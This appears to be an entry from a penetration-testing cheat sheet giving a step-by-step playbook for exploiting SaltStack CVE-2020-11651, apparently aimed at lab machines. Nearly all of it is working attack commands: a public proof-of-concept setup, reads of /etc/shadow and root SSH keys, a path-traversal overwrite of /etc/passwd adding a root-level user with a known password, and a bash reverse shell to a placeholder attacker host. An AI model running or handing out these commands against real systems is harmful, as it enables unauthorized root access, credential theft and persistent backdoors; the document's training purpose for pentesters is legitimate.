title: SaltStack — CVE-2020-11651 (Unauthenticated RCE / File Read / File Write)
body:
SaltStack is an infrastructure automation platform. Ports 4505 and 4506 running ZeroMQ ZMTP are the giveaway — 4505 is the publish bus, 4506 is the request/reply channel to the master. CVE-2020-11651 is an authentication bypass in the ClearFuncs class that lets an unauthenticated client obtain the root key and call master functions directly: arbitrary file read, arbitrary file write, and remote command execution. Affects SaltStack < 3000.2. Exploit is a Python script that requires the salt module — needs a venv since Kali blocks system pip.

The /etc/passwd write technique is the cleanest path to root SSH access: read the current passwd, append a new root-UID user with a known password hash, upload the modified file, SSH in. No reverse shell needed.
cmd:
# ══════════════════════════════════════════════════
# IDENTIFY — nmap fingerprint
# ══════════════════════════════════════════════════
# 4505/tcp  open  zmtp  ZeroMQ ZMTP 2.0
# 4506/tcp  open  zmtp  ZeroMQ ZMTP 2.0
# Both open = SaltStack master. Check 8000 for Salt API (HTTP).
# Version check:
curl -sk http://$ip:8000/  # Salt API may expose version in JSON

# ══════════════════════════════════════════════════
# SETUP — venv (salt module blocked by PEP 668)
# ══════════════════════════════════════════════════
git clone https://github.com/jasperla/CVE-2020-11651-poc exploits/CVE-2020-11651-poc
cd exploits/CVE-2020-11651-poc
python3 -m venv venv
source venv/bin/activate
pip install salt
# (salt package is ~15MB — takes a moment)
# Prompt shows (venv) when active — pip installs go here, no PEP668 error
# Re-activate next session: source venv/bin/activate

# ══════════════════════════════════════════════════
# CONFIRM VULNERABILITY
# ══════════════════════════════════════════════════
python3 exploit.py --master $ip
# [+] Checking salt-master ($ip:4506) status... ONLINE
# [+] Checking if vulnerable to CVE-2020-11651... YES
# [*] root key obtained: <key>
# If YES → proceed. If NO → version is patched.

# ══════════════════════════════════════════════════
# STEP 1 — ARBITRARY FILE READ
# ══════════════════════════════════════════════════
python3 exploit.py --master $ip -r /etc/passwd
python3 exploit.py --master $ip -r /etc/shadow
python3 exploit.py --master $ip -r /root/proof.txt
python3 exploit.py --master $ip -r /root/.ssh/id_rsa
# Useful reads: /etc/passwd (users), /etc/shadow (hashes), /root/proof.txt, SSH keys

# ══════════════════════════════════════════════════
# STEP 2 — /etc/passwd WRITE → ROOT SSH (cleanest path)
# ══════════════════════════════════════════════════
# Read current passwd first:
python3 exploit.py --master $ip -r /etc/passwd > passwd
# Strip the exploit banner lines (keep only passwd content):
grep -v '\[' passwd | grep -v '^$' | grep ':' > passwd_clean && mv passwd_clean passwd

# Generate hash for your password:
openssl passwd w00t     # → Fdzt.eqJQ4s0g (or use your own)

# Append root-level user:
echo "jimi421:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> passwd

# Upload modified passwd back:
python3 exploit.py --master $ip --upload-src passwd --upload-dest ../../../../../../etc/passwd
# [+] Wrote data to file /srv/salt/../../../../../../etc/passwd

# Verify it landed:
python3 exploit.py --master $ip -r /etc/passwd | grep jimi421

# SSH in as root:
ssh jimi421@$ip   # password: w00t
id                # uid=0(root)

# ══════════════════════════════════════════════════
# ALTERNATIVE — DIRECT RCE via exec
# ══════════════════════════════════════════════════
# The exploit also supports --exec for command execution:
python3 exploit.py --master $ip --exec 'id'
python3 exploit.py --master $ip --exec 'cat /root/proof.txt'
# Reverse shell via exec:
python3 exploit.py --master $ip --exec 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'
# (set up nc -lvnp <lport> on Kali first)

# ══════════════════════════════════════════════════
# TROUBLESHOOTING
# ══════════════════════════════════════════════════
# 'ModuleNotFoundError: No module named salt' → venv not activated
#   source venv/bin/activate  then retry

# Upload path traversal: exploit writes to /srv/salt/../../etc/passwd
#   Always use ../../../../../../etc/passwd (6 levels up from /srv/salt/)
#   Verify with -r /etc/passwd after upload

# DeprecationWarning about salt.transport.client → harmless, ignore it
#   salt 3008.x deprecates old transport module — exploit still works

# 'OFFLINE' on master check → wrong port or firewall
#   Confirm 4506 is open: nmap -sT -Pn -p 4506 $ip
warn: The exploit banner lines (lines starting with [) in the file read output must be stripped before using the output as a file — otherwise you corrupt /etc/passwd and may lock yourself out. Always verify the uploaded file with -r /etc/passwd before SSH. Keep a backup of the original passwd output in case recovery is needed.

choices.label: Got root via passwd write — grab proof
Got shadow hashes via file read — crack them
